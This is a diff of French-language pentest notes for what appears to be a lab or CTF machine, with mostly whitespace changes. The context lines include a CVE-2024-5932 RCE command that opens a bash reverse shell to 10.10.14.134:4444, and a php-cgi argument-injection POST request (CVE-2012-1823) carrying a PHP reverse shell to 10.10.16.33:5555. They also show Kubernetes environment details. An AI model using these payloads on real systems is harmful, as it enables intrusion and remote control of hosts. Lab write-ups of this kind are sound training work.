@@ -1,6 +1,4 @@
 
-
-
 ![[IMG-20260115182823570.png]]
 
 ```
@@ -9,9 +7,7 @@ python3 CVE-2024-5932-rce.py \
   -c "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.134/4444 0>&1'"
 ```
 
-
 ![[IMG-20260115190938163.png]]
-
 
 ![[IMG-20260115190900250.png]]
 
@@ -26,7 +22,9 @@ Machine Cible:
 
 Machine atttaquante:
 ![[IMG-20260115194433931.png]]
+
 ![[IMG-20260116030630630.png]]
+
 ![[IMG-20260116030316748.png]]
 
 Variable environnement:
@@ -41,12 +39,8 @@ LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
 On utilise nikto pour footprinter les siteweb:
 ![[IMG-20260118160714840.png]]
 
-
 [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html#old-php--cgi--rce-cve-2012-1823-cve-2012-2311)
-
-
 ![[IMG-20260119004545787.png]]
-
 
 ```
 POST /cgi-bin/php-cgi?-d+disable_functions=+-d+auto_prepend_file=php://input HTTP/1.1
@@ -58,8 +52,8 @@ Content-Length: 77
 php -r '$sock=fsockopen("10.10.16.33",5555);shell_exec("sh <&3 >&3 2>&3");'
 ```
 
-
 ![[IMG-20260119004711181.png]]
+
 Source: https://red.infiltr8.io/cloud-cicd-pentesting/kubernetes/initial-access
 ![[IMG-20260119151437476.png]]
 
@@ -87,13 +81,11 @@ cd0d39uShuQCIQDMgaSW8nrpMfNExuGLMZhcsVrUr5XXN8F5b/zYi5snkQ==
 -----END CERTIFICATE-----
 ```
 
-
 env:
 ```
 KUBERNETES_SERVICE_HOST=10.43.0.1
 KUBERNETES_PORT=tcp://10.43.0.1:443
 ```
-
 
 ![[IMG-20260119152133309.png]]
 
